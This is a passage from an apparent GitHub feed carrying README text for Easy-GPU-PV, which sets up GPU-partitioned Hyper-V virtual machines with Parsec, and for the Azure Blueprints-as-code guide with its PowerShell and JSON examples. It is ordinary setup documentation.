account&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Prerequisites:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows 10 20H1+ Pro, Enterprise or Education OR Windows 11 Pro, Enterprise or Education. Windows 11 on host and VM is preferred due to better compatibility.&lt;/li&gt; &#xA; &lt;li&gt;Matched Windows versions between the host and VM. Mismatches may cause compatibility issues, blue-screens, or other issues. (Win10 21H1 + Win10 21H1, or Win11 21H2 + Win11 21H2, for example)&lt;/li&gt; &#xA; &lt;li&gt;Desktop Computer with dedicated NVIDIA/AMD GPU or Integrated Intel GPU - Laptops with NVIDIA GPUs are not supported at this time, but Intel integrated GPUs work on laptops. GPU must support hardware video encoding (NVIDIA NVENC, Intel Quicksync or AMD AMF).&lt;/li&gt; &#xA; &lt;li&gt;Latest GPU driver from Intel.com or NVIDIA.com, don&#39;t rely on Device manager or Windows update.&lt;/li&gt; &#xA; &lt;li&gt;Latest Windows 10 ISO &lt;a href=&#34;https://www.microsoft.com/en-gb/software-download/windows10ISO&#34;&gt;downloaded from here&lt;/a&gt; / Windows 11 ISO &lt;a href=&#34;https://www.microsoft.com/en-us/software-download/windows11&#34;&gt;downloaded from here.&lt;/a&gt; - Do not use Media Creation Tool, if no direct ISO link is available, follow &lt;a href=&#34;https://www.nextofwindows.com/downloading-windows-10-iso-images-using-rufus&#34;&gt;this guide.&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Virtualisation enabled in the motherboard and &lt;a href=&#34;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v&#34;&gt;Hyper-V fully enabled&lt;/a&gt; on the Windows 10/ 11 OS (requires reboot).&lt;/li&gt; &#xA; &lt;li&gt;Allow Powershell scripts to run on your system - typically by running &#34;Set-ExecutionPolicy unrestricted&#34; in Powershell running as Administrator.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Instructions&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Make sure your system meets the prerequisites.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jamesstringerparsec/Easy-GPU-PV/archive/refs/heads/main.zip&#34;&gt;Download the Repo and extract.&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Search your system for Powershell ISE and run as Administrator.&lt;/li&gt; &#xA; &lt;li&gt;In the extracted folder you downloaded, open PreChecks.ps1 in Powershell ISE. Run the files from within the extracted folder. Do not move them.&lt;/li&gt; &#xA; &lt;li&gt;Open and Run PreChecks.ps1 in Powershell ISE using the green play button and copy the GPU Listed (or the warnings that you need to fix).&lt;/li&gt; &#xA; &lt;li&gt;Open CopyFilesToVM.ps1 Powershell ISE and edit the params section at the top of the file, you need to be careful about how much ram, storage and hard drive you give it as your system needs to have that available. On Windows 10 the GPUName must be left as &#34;AUTO&#34;, In Windows 11 it can be either &#34;AUTO&#34; or the specific name of the GPU you want to partition exactly how it appears in PreChecks.ps1. Additionally, you need to provide the path to the Windows 10/11 ISO file you downloaded.&lt;/li&gt; &#xA; &lt;li&gt;Run CopyFilesToVM.ps1 with your changes to the params section - this may take 5-10 minutes.&lt;/li&gt; &#xA; &lt;li&gt;Open and sign into Parsec on the VM. You can use Parsec to connect to the VM up to 4K60FPS.&lt;/li&gt; &#xA; &lt;li&gt;You should be good to go!&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Upgrading GPU Drivers when you update the host GPU Drivers&lt;/h3&gt; &#xA;&lt;p&gt;It&#39;s important to update the VM GPU Drivers after you have updated the Host GPUs drivers. You can do this by...&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Reboot the host after updating GPU Drivers.&lt;/li&gt; &#xA; &lt;li&gt;Open Powershell as administrator and change directory (CD) to the path that CopyFilestoVM.ps1 and Update-VMGPUPartitonDriver.ps1 are located.&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;Update-VMGPUPartitonDriver.ps1 -VMName &#34;Name of your VM&#34; -GPUName &#34;Name of your GPU&#34;&lt;/code&gt; (Windows 10 GPU name must be &#34;AUTO&#34;)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Values&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;VMName = &#34;GPUP&#34;&lt;/code&gt; - Name of VM in Hyper-V and the computername / hostname&lt;br&gt; &lt;code&gt;SourcePath = &#34;C:\Users\james\Downloads\Win11_English_x64.iso&#34;&lt;/code&gt; - path to Windows 10/ 11 ISO on your host&lt;br&gt; &lt;code&gt;Edition = 6&lt;/code&gt; - Leave as 6, this means Windows 10/11 Pro&lt;br&gt; &lt;code&gt;VhdFormat = &#34;VHDX&#34;&lt;/code&gt; - Leave this value alone&lt;br&gt; &lt;code&gt;DiskLayout = &#34;UEFI&#34;&lt;/code&gt; - Leave this value alone&lt;br&gt; &lt;code&gt;SizeBytes = 40gb&lt;/code&gt; - Disk size, in this case 40GB, the minimum is 20GB&lt;br&gt; &lt;code&gt;MemoryAmount = 8GB&lt;/code&gt; - Memory size, in this case 8GB&lt;br&gt; &lt;code&gt;CPUCores = 4&lt;/code&gt; - CPU Cores you want to give VM, in this case 4&lt;br&gt; &lt;code&gt;NetworkSwitch = &#34;Default Switch&#34;&lt;/code&gt; - Leave this alone unless you&#39;re not using the default Hyper-V Switch&lt;br&gt; &lt;code&gt;VHDPath = &#34;C:\Users\Public\Documents\Hyper-V\Virtual Hard Disks\&#34;&lt;/code&gt; - Path to the folder you want the VM Disk to be stored in, it must already exist&lt;br&gt; &lt;code&gt;UnattendPath = &#34;$PSScriptRoot&#34;+&#34;\autounattend.xml&#34;&lt;/code&gt; -Leave this value alone&lt;br&gt; &lt;code&gt;GPUName = &#34;AUTO&#34;&lt;/code&gt; - AUTO selects the first available GPU. On Windows 11 you may also use the exact name of the GPU you want to share with the VM in multi GPU situations (GPU selection is not available in Windows 10 and must be set to AUTO)&lt;br&gt; &lt;code&gt;GPUResourceAllocationPercentage = 50&lt;/code&gt; - Percentage of the GPU you want to share with the VM&lt;br&gt; &lt;code&gt;Team_ID = &#34;&#34;&lt;/code&gt; - The Parsec for Teams ID if you are a Parsec for Teams Subscriber&lt;br&gt; &lt;code&gt;Key = &#34;&#34;&lt;/code&gt; - The Parsec for Teams Secret Key if you are a Parsec for Teams Subscriber&lt;br&gt; &lt;code&gt;Username = &#34;GPUVM&#34;&lt;/code&gt; - The VM Windows Username, do not include special characters, and must be different from the &#34;VMName&#34; value you set&lt;br&gt; &lt;code&gt;Password = &#34;CoolestPassword!&#34;&lt;/code&gt; - The VM Windows Password, cannot be blank&lt;br&gt; &lt;code&gt;Autologon = &#34;true&#34;&lt;/code&gt;- If you want the VM to automatically login to the Windows Desktop&lt;/p&gt; &#xA;&lt;h3&gt;Thanks to:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tabs-not-spaces/Hyper-ConvertImage&#34;&gt;Hyper-ConvertImage&lt;/a&gt; for creating an updated version of &lt;a href=&#34;https://github.com/MicrosoftDocs/Virtualization-Documentation/tree/master/hyperv-tools/Convert-WindowsImage&#34;&gt;Convert-WindowsImage&lt;/a&gt; that is compatible with Windows 10 and 11.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/gawainXX&#34;&gt;gawainXX&lt;/a&gt; for help testing and pointing out bugs and feature improvements.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Notes:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;After you have signed into Parsec on the VM, always use Parsec to connect to the VM. Keep the Microsft Hyper-V Video adapter disabled. Using RDP and Hyper-V Enhanced Session mode will result in broken behaviour and black screens in Parsec. RDP and the Hyper-V video adapter only offer a maximum of 30FPS. Using Parsec will allow you to use up to 4k60 FPS.&lt;/li&gt; &#xA; &lt;li&gt;If you get &#34;ERROR : Cannot bind argument to parameter &#39;Path&#39; because it is null.&#34; this probably means you used Media Creation Tool to download the ISO. You unfortunately cannot use that, if you don&#39;t see a direct ISO download link at the Microsoft page, follow &lt;a href=&#34;https://www.nextofwindows.com/downloading-windows-10-iso-images-using-rufus&#34;&gt;this guide.&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Your GPU on the host will have a Microsoft driver in device manager, rather than an nvidia/intel/amd driver. As long as it doesn&#39;t have a yellow triangle over top of the device in device manager, it&#39;s working correctly.&lt;/li&gt; &#xA; &lt;li&gt;A powered on display / HDMI dummy dongle must be plugged into the GPU to allow Parsec to capture the screen. You only need one of these per host machine regardless of number of VM&#39;s.&lt;/li&gt; &#xA; &lt;li&gt;If your computer is super fast it may get to the login screen before the audio driver (VB Cable) and Parsec display driver are installed, but fear not! They should soon install.&lt;/li&gt; &#xA; &lt;li&gt;The screen may go black for times up to 10 seconds in situations when UAC prompts appear, applications go in and out of fullscreen and when you switch between video codecs in Parsec - not really sure why this happens, it&#39;s unique to GPU-P machines and seems to recover faster at 1280x720.&lt;/li&gt; &#xA; &lt;li&gt;Vulkan renderer is unavailable and GL games may or may not work. &lt;a href=&#34;https://www.microsoft.com/en-us/p/opencl-and-opengl-compatibility-pack/9nqpsl29bfff?SilentAuth=1&amp;amp;wa=wsignin1.0#activetab=pivot:overviewtab&#34;&gt;This&lt;/a&gt; may help with some OpenGL apps.&lt;/li&gt; &#xA; &lt;li&gt;If you do not have administrator permissions on the machine it means you set the username and vmname to the same thing, these needs to be different.&lt;/li&gt; &#xA; &lt;li&gt;AMD Polaris GPUS like the RX 580 do not support hardware video encoding via GPU Paravirtualization at this time.&lt;/li&gt; &#xA; &lt;li&gt;To download Windows ISOs with Rufus, it must have &#34;Check for updates&#34; enabled.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Azure/azure-blueprints</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/Azure/azure-blueprints</id>
    <link href="https://github.com/Azure/azure-blueprints" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A library of sample Blueprints that can be easily imported via API or PowerShell&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Managing Blueprints as Code&lt;/h1&gt; &#xA;&lt;p&gt;Using the Blueprints in the Azure Portal is a great way to get started with Blueprints or to use Blueprints on a small-ish scale, but often you’ll want to manage your Blueprints as code for a variety of reasons, such as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sharing blueprints&lt;/li&gt; &#xA; &lt;li&gt;Keeping blueprints in source control&lt;/li&gt; &#xA; &lt;li&gt;Putting blueprints in a CI/CD or release pipeline&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#prerequisites&#34;&gt;Prerequisites&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#how-to-use-this-guide&#34;&gt;How to use this guide&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#quickstart&#34;&gt;Quickstart&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#structure-of-blueprint-artifacts&#34;&gt;Structure of blueprint artifacts&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#blueprint-folder&#34;&gt;Blueprint folder&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#functions&#34;&gt;Functions&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#blueprint&#34;&gt;Blueprint&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#resource-group-properties&#34;&gt;Resource Group properties&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#artifacts&#34;&gt;Artifacts&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#how-parameters-work&#34;&gt;How Parameters work&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#passing-values-between-artifacts&#34;&gt;Passing values between artifacts&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#sequencing-the-deployment-of-artifacts&#34;&gt;Sequencing the deployment of artifacts&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#push-the-blueprint-definition-to-azure&#34;&gt;Push the Blueprint definition to Azure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#next-steps&#34;&gt;Next steps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Next steps to operationalize blueprints&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/pipelines-scripts/build.ps1&#34;&gt;Create and publish the blueprint definition from source with powershell or CI/CD&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/pipelines-scripts/release.ps1&#34;&gt;Assigning with powershell or CI/CD&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;p&gt;This doc assumes you have a basic understanding of how blueprints work. If you&#39;ve never used Blueprints before, this will be a little overwhelming. We recommend you build your first blueprint with the UI to understand how everything works. You can try it at &lt;a href=&#34;https://aka.ms/getblueprints&#34;&gt;aka.ms/getblueprints&lt;/a&gt; and learn more about it in the &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/governance/blueprints/overview&#34;&gt;docs&lt;/a&gt; or watch this &lt;a href=&#34;https://www.youtube.com/watch?v=cQ9D-d6KkMY&#34;&gt;15 minute overview&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Download the &lt;a href=&#34;https://powershellgallery.com/packages/Az.Blueprint/&#34;&gt;Az.Blueprint module&lt;/a&gt; from the powershell gallery:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Install-Module -Name Az.Blueprint&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How to use this guide&lt;/h2&gt; &#xA;&lt;p&gt;This guide references the files in the &lt;a href=&#34;https://github.com/Azure/azure-blueprints/tree/master/samples/101-boilerplate&#34;&gt;samples/101-boilerplate directory&lt;/a&gt; and deploys the Boilerplate blueprint as a draft definition to Azure.&lt;/p&gt; &#xA;&lt;h2&gt;Quickstart&lt;/h2&gt; &#xA;&lt;p&gt;Push a sample blueprint definition to Azure:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-AzBlueprintWithArtifact -Name Boilerplate -ManagementGroupId &#34;DevMG&#34; -InputPath  &#34;.\samples\101-boilerplate&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Publish a new version of that definition so it can be assigned:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Get the blueprint we just created&#xA;$bp = Get-AzBlueprint -Name Boilerplate -ManagementGroupId &#34;DevMG&#34;&#xA;# Publish version 1.0&#xA;Publish-AzBlueprint -Blueprint $bp -Version 1.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Assign the blueprint to a subscription:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Get the version of the blueprint you want to assign, which we will pas to New-AzBlueprintAssignment&#xA;$publishedBp = Get-AzBlueprint -ManagementGroupId &#34;DevMG&#34; -Name &#34;Boilerplate&#34; -LatestPublished&#xA;&#xA;# Each resource group artifact in the blueprint will need a hashtable for the actual RG name and location&#xA;$rgHash = @{ name=&#34;MyBoilerplateRG&#34;; location = &#34;eastus&#34; }&#xA;&#xA;# all other (non-rg) parameters are listed in a single hashtable, with a key/value pair for each parameter&#xA;&#xA;$user = Get-AzADUser -UserPrincipalName &#34;user@domain.com&#34;&#xA;$parameters = @{ principalIds=$user.Id }&#xA;&#xA;# All of the resource group artifact hashtables are themselves grouped into a parent hashtable&#xA;# the &#39;key&#39; for each item in the table should match the RG placeholder name in the blueprint&#xA;$rgArray = @{ SingleRG = $rgHash }&#xA;&#xA;# Assign the new blueprint to the specified subscription (Assignment updates should use Set-AzBlueprintAssignment&#xA;New-AzBlueprintAssignment -Name &#34;UniqueBlueprintAssignmentName&#34; -Blueprint $publishedBp -Location eastus -SubscriptionId &#34;00000000-1111-0000-1111-000000000000&#34; -ResourceGroupParameter $rgArray -Parameter $parameters&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Structure of blueprint artifacts&lt;/h2&gt; &#xA;&lt;p&gt;A blueprint consists of the main blueprint json file and a series of artifact json files. Simple 😊&lt;/p&gt; &#xA;&lt;p&gt;So you will always have something like the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Blueprint directory (also the default blueprint name)&#xA;* blueprint.json&#xA;* artifacts&#xA;    - artifact.json&#xA;    - ...&#xA;    - more-artifacts.json&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Blueprint folder&lt;/h3&gt; &#xA;&lt;p&gt;Create a folder or directory on your computer to store all of your blueprint files. &lt;strong&gt;The name of this folder will be the default name of the blueprint&lt;/strong&gt; unless you specify a new name in the blueprint json file.&lt;/p&gt; &#xA;&lt;h3&gt;Functions&lt;/h3&gt; &#xA;&lt;p&gt;We support a variety of expressions that can be used in either a blueprint defintion or artifact such as &lt;code&gt;concat()&lt;/code&gt; and &lt;code&gt;parameters()&lt;/code&gt;. For a full reference of functions and how to use them, you can look at the &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/governance/blueprints/reference/blueprint-functions&#34;&gt;Functions for use with Azure Blueprints&lt;/a&gt; doc.&lt;/p&gt; &#xA;&lt;h3&gt;Blueprint&lt;/h3&gt; &#xA;&lt;p&gt;This is your main Blueprint file. In order to be processed successfully, the blueprint must be created in Azure before any artifacts (policy, role, template) otherwise the calls to push those artifacts will fail. That&#39;s because the &lt;strong&gt;artifacts are child resources of a blueprint&lt;/strong&gt;. The &lt;code&gt;Az.Blueprint&lt;/code&gt; module takes care of this for you automatically. Typically, you will name this blueprint.json, but this name is up to you and customizing this will not affect anything.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s look at our Boilerplate sample &lt;code&gt;blueprint.json&lt;/code&gt; file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;properties&#34;: {&#xA;        &#34;description&#34;: &#34;This will be displayed in the essentials, so make it good&#34;,&#xA;        &#34;targetScope&#34;: &#34;subscription&#34;,&#xA;        &#34;parameters&#34;: { &#xA;            &#34;principalIds&#34;: {&#xA;                &#34;type&#34;: &#34;string&#34;,&#xA;                &#34;metadata&#34;: {&#xA;                    &#34;displayName&#34;: &#34;Display Name for Blueprint parameter&#34;,&#xA;                    &#34;description&#34;: &#34;This is a blueprint parameter that any artifact can reference. We&#39;ll display these descriptions for you in the info bubble&#34;,&#xA;                    &#34;strongType&#34;: &#34;PrincipalId&#34;&#xA;                }&#xA;            },&#xA;            &#34;genericBlueprintParameter&#34;: {&#xA;                &#34;type&#34;: &#34;string&#34;&#xA;            }&#xA;        },&#xA;        &#34;resourceGroups&#34;: {&#xA;            &#34;SingleRG&#34;: {&#xA;                &#34;description&#34;: &#34;An optional description for your RG artifact. FYI location and name properties can be left out and we will assume they are assignment-time parameters&#34;,&#xA;                &#34;location&#34;: &#34;eastus&#34;&#xA;            }&#xA;        }&#xA;    },&#xA;    &#34;type&#34;: &#34;Microsoft.Blueprint/blueprints&#34; &#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Some key takeaways to note from this example:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;There are two optional blueprint &lt;code&gt;parameters&lt;/code&gt;: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;principalIds&lt;/code&gt; and &lt;code&gt;genericBlueprintParameter&lt;/code&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;These parameters can be referenced in any artifact.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The &lt;code&gt;principalIds&lt;/code&gt; parameter uses a &lt;code&gt;strongType&lt;/code&gt; property which loads a helper UI in the portal when this blueprint is assigned.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;The &lt;code&gt;resourceGroups&lt;/code&gt; artifacts are declared here, not in their own files.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Resource Group properties&lt;/h3&gt; &#xA;&lt;p&gt;You&#39;ll notice the &lt;strong&gt;resource group artifacts are defined within the main blueprint json file&lt;/strong&gt;. In this case, we&#39;ve configured a resource group with these properties:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hardcodes a location for the resource group of &lt;code&gt;eastus&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Sets a &lt;em&gt;placeholder&lt;/em&gt; name &lt;code&gt;SingleRG&lt;/code&gt; for the resource group. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The resource group is not created yet, that will be determined at assignment time. The placeholder is just to help you organize the definition and serves as a reference point for your artifacts.&lt;/li&gt; &#xA;   &lt;li&gt;Optionally you could hardcode the resource group name by adding &lt;code&gt;&#34;name&#34;: &#34;myRgName&#34;&lt;/code&gt; as a child property of the &lt;code&gt;SingleRG&lt;/code&gt; object.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/blueprints/blueprints/createorupdate#blueprint&#34;&gt;Full spec of a blueprint&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Artifacts&lt;/h3&gt; &#xA;&lt;p&gt;Let’s look at the Boilerplate &lt;code&gt;policyAssignment.json&lt;/code&gt; artifact:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;properties&#34;: {&#xA;        &#34;policyDefinitionId&#34;: &#34;/providers/Microsoft.Authorization/policyDefinitions/a451c1ef-c6ca-483d-87d-f49761e3ffb5&#34;,&#xA;        &#34;parameters&#34;: {},&#xA;        &#34;dependsOn&#34;: [],&#xA;        &#34;displayName&#34;: &#34;My Policy Definition that will be assigned (Currently auditing usage of custome roles)&#34;&#xA;    },&#xA;    &#34;kind&#34;: &#34;policyAssignment&#34;,&#xA;    &#34;type&#34;: &#34;Microsoft.Blueprint/blueprints/artifacts&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All artifacts share common properties:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;Kind&lt;/code&gt; can be: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;template&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;roleAssignment&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;policyAssignment&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Type&lt;/code&gt; – this will always be: &lt;code&gt;Microsoft.Blueprint/blueprints/artifacts&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;properties&lt;/code&gt; – this is what defines the artifact itself. Some properties of &lt;code&gt;properties&lt;/code&gt; are common while others are specific to each type. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Common properties &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;dependsOn&lt;/code&gt; - optional. You can declare dependencies to other artifacts by referencing the artifact name (which by default is the filename without &lt;code&gt;.json&lt;/code&gt;). More info &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/governance/blueprints/concepts/sequencing-order#customizing-the-sequencing-order&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;code&gt;resourceGroup&lt;/code&gt; – optional. Use the resource group placeholder name to target this artifact to that resource group. If this property isn&#39;t specified it will target the subscription.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Full spec for each artifact type:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/blueprints/artifacts/createorupdate#policyassignmentartifact&#34;&gt;Policy Assignment&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/blueprints/artifacts/createorupdate#roleassignmentartifact&#34;&gt;Role Assignment&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/blueprints/artifacts/createorupdate#templateartifact&#34;&gt;Template&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How Parameters work&lt;/h3&gt; &#xA;&lt;p&gt;Nearly everything in a blueprint definition can be parameterized. The only things that can&#39;t be parameterized are the &lt;code&gt;roleDefinitionId&lt;/code&gt; and &lt;code&gt;policyDefinitionId&lt;/code&gt; in the &lt;code&gt;rbacAssignment&lt;/code&gt; and &lt;code&gt;policyAssignment&lt;/code&gt; artifacts respectively. Parameters are defined in the main blueprint file and can be referenced in any artifact.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s a simple parameter declaration which is a simplified version from &lt;code&gt;blueprint.json&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&#34;parameters&#34;: { &#xA;    &#34;genericBlueprintParameter&#34;: {&#xA;        &#34;type&#34;: &#34;string&#34;&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use the same properties you can in an ARM template like &lt;code&gt;defaultValue&lt;/code&gt;, &lt;code&gt;allowedValues&lt;/code&gt;, etc.&lt;/p&gt; &#xA;&lt;p&gt;And we can reference a parameter like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&#34;properties&#34;: {&#xA;    &#34;genericBlueprintParameter&#34;: &#34;[parameters(&#39;principalIds&#39;)]&#34;,&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This gets a little complicated when you want to pass those variables to an artifact that, itself, also has parameters.&lt;/p&gt; &#xA;&lt;p&gt;First, in &lt;code&gt;template.json&lt;/code&gt; we need to set the &lt;em&gt;artifact&lt;/em&gt; parameter value &lt;code&gt;myTemplateParameter&lt;/code&gt; to have a &lt;code&gt;value&lt;/code&gt; of &lt;code&gt;genericBlueprintParameter&lt;/code&gt; which is our &lt;em&gt;blueprint&lt;/em&gt; parameter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&#34;properties&#34;: {&#xA;    &#34;parameters&#34;: {&#xA;        &#34;myTemplateParameter&#34;: {&#xA;            &#34;value&#34;: &#34;[parameters(&#39;genericBlueprintParameter&#39;)]&#34;&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This should look familiar if you&#39;ve &lt;a href=&#34;https://docs.microsoft.com/azure/azure-resource-manager/templates/linked-templates#scope-for-expressions-in-nested-templates&#34;&gt;passed parameters inline to a nested deployment&lt;/a&gt;. Instead of getting these parameter values from a file, we are getting them from the list of blueprint parameters.&lt;/p&gt; &#xA;&lt;p&gt;And then you can reference that parameter within the &lt;code&gt;template&lt;/code&gt; section in &lt;code&gt;template.json&lt;/code&gt; like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&#34;template&#34;: {&#xA;    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,&#xA;    &#34;contentVersion&#34;: 